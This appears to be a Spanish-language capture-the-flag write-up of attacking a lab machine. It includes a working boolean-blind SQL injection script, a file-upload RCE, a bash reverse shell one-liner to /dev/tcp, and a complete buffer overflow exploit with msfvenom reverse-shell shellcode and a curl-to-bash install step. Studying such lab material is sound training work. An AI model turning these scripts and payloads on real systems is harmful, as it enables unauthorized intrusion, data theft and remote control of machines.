---------------------------------------------
Tags: #SQLI #RCE #BufferOverflow 

-----------------------
# Reconocimiento (*Linux*)

- Lo primero que hacemos es un **escaneo de equipos** que estén conectados a mi red de esta forma:

```ruby
arp-scan -I eth0 --localnet
```

![[Pasted image 20250105164622.png]]
![[Pasted image 20241207102339.png]]


# Escaneo(*80*)

![[Pasted image 20241207103023.png]]

```css
sudo nmap -p80 -sCV <IP> -oN escaneo  
```

![[Pasted image 20241207103128.png]]

-------------------------------

# Port 80

- Navegando por la web hicimos un `control + u` y observamos un doble ``==``  que nos llamo la atención  y vemos que estaba en **base64**, lo cual vamos decodificar

![[Pasted image 20241207103736.png]]


- Lo de codificamos y vemos que **nos dá otra cadena en base64**, lo volvemos a decodificar y nos da una **ruta** que vamos a poner en la web
![[Pasted image 20241207104313.png]]
![[Pasted image 20241207104143.png]]



- Tenemos un panel de login

![[Pasted image 20241207104613.png]]


- Si vamos a la web principal en la parte de **Contact Us** tenemos posibles usuarios la cual vamos a probar en el panel

![[Pasted image 20241207104730.png]]

# BurpSuite

- El único que funciona es `rmichaels` ya que nos dice **invalid password** y en los otros users nos dice **invalid username**
	- Por ende lo que vamos a hacer es interceptar con Burp la petición


![[Pasted image 20241207105726.png]]


- Para burlar la contraseña podemos representar un **array** para que devuelva un NULL y se se emplea un **strcompare** nos va da devolver un exitoso por ende considera que lo que pusimos es **correcto**
	- Y vemos que si, que funcionó.

![[Pasted image 20241207105959.png]]

- Vemos que la **flag3** dice que continuemos con el CMS del link 

![[Pasted image 20241207110129.png]]
![[Pasted image 20241207110242.png]]


- Dentro del link tenemos esto:

![[Pasted image 20241207110549.png]]


- Probamos hacer un **LFI** pero no funcionó, pero ponemos un comilla nos **salta un error** lo cual es curioso
	- Por ende otra ves vamos a usar Burp

![[Pasted image 20241207110701.png]]


# SQLI *Boolean* Based *Blind*

- Si hacemos un `'or '1'='1-- -` vemos que cambia la respuesta 
	- Entonces lo que vamos a hacer es jugar con condiciones booleanas, si algo devuelve **TRUE exitoso**, devuelve un output, si no es correcto cambia el output

![[Pasted image 20241207111400.png]]


- Ahora lo que hacemos es probar si la base de datos `mysql` que siempre esta existe, jugando `limit` para que nos de una única base de datos.
	- Si la igualdad es correcta (si mysql está en la segunda base de datos,) veremos el la respuesta **Welcome to the IMF Administration.**

![[Pasted image 20241226105314.png]]

- Para comprobar si la primera base de datos era **information_schema** y vemos que sí
![[Pasted image 20241226105621.png]]



# Python Scripting

- Vamos a hacernos un script en Python para fuzear carácter por carácter y obtener el nombre de la base de datos.

### Cuantas Bases de Datos hay

- Con este comando podemos observar cuantas bases de datos hay y vemos que son 5 porque cuando lo igualamos a 5 nos sale el mensajito **Welcome to the IMF Administration.**
	- `' or (select count(schema_name) from information_schema.schemata)='5 `  (poner Ctrl+u para urlenconded)

```python
#!/usr/bin/python3

from pwn import *   #Para poder jugar con barras de progresos
import requests     #Para hacer peticiones HTTP
import string       #Para generar los caracteres de la contraseña
import time         #Para poder hacer sleep
import sys          #Para poder usar sys.exit()
import pdb          #Para poder hacer debugging
import signal       #Para hacer CTRL+C 



def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)



#Variables globales
main_url = "http://192.168.0.192/imfadministrator/cms.php?pagename=home"   #La peticion se tramita por GET
characters = string.ascii_lowercase + '-_'    #string.punctuation  #Abarca todo los simbolos el punctuation


def makeRequest():

    cookies = {"PHPSESSID": "hq7ejo76tsdk4prr3kdn9lsvm1"}   #Cookie de la sesion

    database = ""


    #Barras de Progreso
    p1 = log.progress("Fuerza Bruta")  
    p1.status("Iniciando proceso de fuerza bruta...")    #Para poder ver el mensaje de la barra de progreso
    time.sleep(2)   #Para poder hacer sleep

    p2 = log.progress("Databases")



    for dbs in range(0, 5): #porque hay 5 bases de datos 
        for position_character in range(1, 30):   #suponemos que la base de datos tiene 30 caracteres o menos
            for character in characters:
                sqli = main_url + f"'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"

                #p1.satatus(sqli)   #si quiero ver como se tramita para cada posicion y cada caracter

                r = requests.get(sqli, cookies=cookies)  #para poder ver la respuesta de la peticion

                if "Welcome to the IMF Administration" in r.text:
                    database += character
                    p2.status(database)  #jugamos con esta barra de progreso para que me muestre los datos de la base de datos
                    break

        database += ","


if __name__ == '__main__':
    makeRequest()

```


- Vemos que nos sacó una base de datos llamada `admin` que parece interesante
![[Pasted image 20241226112712.png]]


- Ahora listamos las **tablas** de la base de datos `admin` y vemos **pages**
	- solo cambiamos esto del script: `'+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"`

![[Pasted image 20241226114214.png]]

- Ahora nos saco las **columnas**
	- El cambio:`"'+and(select+substring(column_name{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"`

![[Pasted image 20241226114442.png]]



- Ahora vemos que dentro de `pagename` nos sacó algo que no estaba en la web `tutorials-incomplete`
	- Cambio: `"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
`
![[Pasted image 20241226115425.png]]
![[Pasted image 20241226115628.png]]



- Si observamos bien en la imagen hay un **QR**, por ende lo escaneamos desde esta página [QR-online](https://4qrcode.com/scan-qr-code.php)

![[Pasted image 20241226120729.png]]


- Vemos que tenemos una ruta 
![[Pasted image 20241226120825.png]]

# BurpSuite - Upload

- Vamos a interceptar con Burp la petición para ver que tipo de extensión nos deja subir
![[Pasted image 20241226120946.png]]


- Probando distintas cosas pudimos sacar el tipo de archivo que aceptaba que era `GIF`
	- Nos copiamos los numeritos que están en el comentario y lo ponemos en la web
![[Pasted image 20250105170947.png]]


- Para saber donde se almacenaba el archivo encontramos que es en `uploads` ya que nos da un Forbidden 
![[Pasted image 20250105171139.png]]

- Vemos que tenemos ejecución remota de comandos
	- Por ende nos vamos a entablar una Shell de bash ---> `bash -c "bash -i >%26 /dev/tcp/IP/443 0>%261"`

![[Pasted image 20250105171111.png]]


- Vemos que tamos dentro de la máquina

![[Pasted image 20250105171850.png]]

- Ahora hacemos el **tratamiento de la TTY**
```bash
script /dev/null -c bash
ctrl + z
stty raw -echo ;fg
reset xterm
export TERM=xterm
export SHELL=bash
```


---------------------------------------
------------------------
# Escalada *ROOT*

- Tenemos la quinta flag que la decodificamos 
![[Pasted image 20250105172329.png]]
![[Pasted image 20250105172350.png]]


- Viendo los **puertos abiertos** hay en la máquinas observamos uno poco común que es el `7788`
	- Nos tratamos de conectar y nos pide in **Agent ID** que no tenemos, buscamos el binario en donde se almacenaba y lo encontramos
![[Pasted image 20250105175653.png]]

- Ahora jugamos con `ltrace` para que ver que es lo que pasa cuando ejecutamos el binario `agent` y vemos que lo compara con **strncompare** de esto `48093572` 
![[Pasted image 20250105180302.png]]


- Vemos que si funcionó el **ID**, ahora investigando vemos que la **opción 3** nos devuelve la cadena que pongamos.
	- Por lo tanto vamos probar a meterle muchas **"A"** y  vemos que dice **segmentation fault**, por lo tanto se ha aplicado un desbordamiento del Buffer asique podemos pensar en **Buffer Overflow**
![[Pasted image 20250105180446.png]]

# Buffer Overflow

- Como vimos tenemos el binario **Agent**  que si ponemos muchas "**A**" nos va a dar error ya que esta programado para una cierta cantidad de bytes

![[Pasted image 20250107143031.png]]


- Una ves visto eso, lo que hacemos ahora es pasarnos el **binario Agent** a nuestra máquina de atacante y poder jugar con **GDB-GEF** 

```bash
#Máquina atacante
nc -nlvp 4444 > agent

#Máquina víctima
cd /usr/local/bin
nc ip 4444 < agent
```

- Ahora con ``md5sum`` comprobamos el hash para **ver si son iguales** por si hubo alguna corrupción pero vemos que no

![[Pasted image 20250107144348.png]]
![[Pasted image 20250107144408.png]]


- Ahora vamos a ver las protecciones del binario con `checksec` y vemos que no tiene ninguna protección
	- Como el NX no esta habilitado , el Shellcode nos lo va a interpretar

```bash
sudo apt update -y && sudo apt upgrade -y
sudo apt install checksec
sudo apt install python3-pwntools
```

![[Pasted image 20250107155152.png]]

### Instalar GDB-GEF

```bash
sudo apt install gdb
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

# ASLR *->* Habilitado

- Como están cambiando los números esto quiere decir que el **ASLR** está **HABILITADO**
	- Como los números son cortos vemos que estamos en **máquina de 32 bits** (haciendo un `file agent` tamb podes ver que el binario es de 32-bit)
 ![[Pasted image 20250109110108.png]]



- Bien ahora lo que vamos a averiguar es cuentas ``A`` hay que meter hasta llegar a sobrescribir este registro "**EIP**" (offset llamado a veces)
	- Hay un utilidad en peda que es esta `pattern create` **---->** Lo que hacemos es crear un cadena aleatorias para después jugar con **pattern offset**

![[Pasted image 20250108105211.png]]


- Nos lo copiamos toda esa cadena de caracteres y ejecutamos el binario y lo pegamos y al darle ale **Enter** vemos que el `$eip` vale **raab**

![[Pasted image 20250108105338.png]]


- Entonces si ahora hacemos un `pettern offset $eip` nos dice que son **168 caracteres** para luego sobrescribir el EIP

![[Pasted image 20250108105448.png]]



- Ahora vemos si haciendo que *nos imprima 168 A* y como *Últimos 4 bytes la B*  -----> vemos si **nos retorna BBBB y 0x42424242** que es la B en hexadecimal

![[Pasted image 20250108110427.png]]
![[Pasted image 20250108110358.png]]


# Ret2reg

- Una ves *sobrescribimos* el registro **EIP** toda las demás cadena que pongamos van a estar en el *comienzo* del **ESP** 
	- Si vemos **EAX** vale AAAA... , entonces si filtramos por `x/16wx $eax` están las Aes pero si retrocedemos *cuatro para atrás* ya no es el mismo valor, entonces podemos pensar que el *comienzo* del *payload* corresponde al registro **$eax**

 ![[Pasted image 20250109102925.png]]


## Msfvenom

- Vamos a crear el ``shellcode`` para que me entable una Reverse Shell 
	- ``-b``  --> es de Bad Chars, para que nos cree un shellcode sin esos caracteres

![[Pasted image 20250108120607.png]]


- Bien ahora nos vamos a crear un **script.py** en la máquina víctima en  ``/tmp`` en donde pegamos nuestro shellcode 
	- Ahora vamos a nuestra máquina y ponemos el siguiente comando para buscar el `call eax` que lo que nos va a buscar es el **Opeartion Code**

![[Pasted image 20250109092231.png]]


- Una ves obtenido, jugamos con `objdump` y filtramos por esa cadena `FF D0`
	- Tenemos una **dirección** en el binario en el que podemos apuntar para  ir por ahí 

![[Pasted image 20250109092743.png]]



- Lo que vamos a hacer ahora es que  la **EIP** apunta a esa dirección porque nosotros podemos controlarlo, ya que en esa dirección se aplica un `call eax` por ende el flujo del programa **va a el registro $eax** que comenzaría con el flujo del ``shellcode`` que creamos con ``msfvenom``
	- Por ende ahora nuestro **script.py** quedaría de esta forma:

```python
#!/usr/bin/python3

import socket

offset = 168

#Shellcode
buf =  b""
buf += b"\xba\x78\x35\x3e\xca\xdb\xd4\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x12\x31\x55\x12\x83\xed\xfc\x03\x2d"
buf += b"\x3b\xdc\x3f\xfc\x98\xd7\x23\xad\x5d\x4b\xce\x53"
buf += b"\xeb\x8a\xbe\x35\x26\xcc\x2c\xe0\x08\xf2\x9f\x92"
buf += b"\x20\x74\xd9\xfa\x72\x2e\x19\x66\x1a\x2d\x1a\x97"
buf += b"\x60\xb8\xfb\x27\xf0\xeb\xaa\x14\x4e\x08\xc4\x7b"
buf += b"\x7d\x8f\x84\x13\x10\xbf\x5b\x8b\x84\x90\xb4\x29"
buf += b"\x3c\x66\x29\xff\xed\xf1\x4f\x4f\x1a\xcf\x10"

#Lo que nos falta para sobreescribir el EIP ya que el shellcode es de 95 bytes entonces seria (168-95)
buf += b"A"*(offset-len(buf))

#little endian
buf += b"\x63\x85\x04\x08\n"  # 8048563 -> jmp EAX

#Establecer Conexion TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 7788))

#Enviar la cadena
s.send(b"48093572\n")  # barra n-> seria un ENTER
data = s.recv(1024)

s.send(b"3\n")
data = s.recv(1024)

s.send(buf)  #Por ultimo enviamos nuestro shellcode
```


- Estamos **dentro** de la máquina víctima!

![[Pasted image 20250109104221.png]]

- Para terminar obtuvimos la la **última flag** de ``ROOT``
![[Pasted image 20250109104343.png]]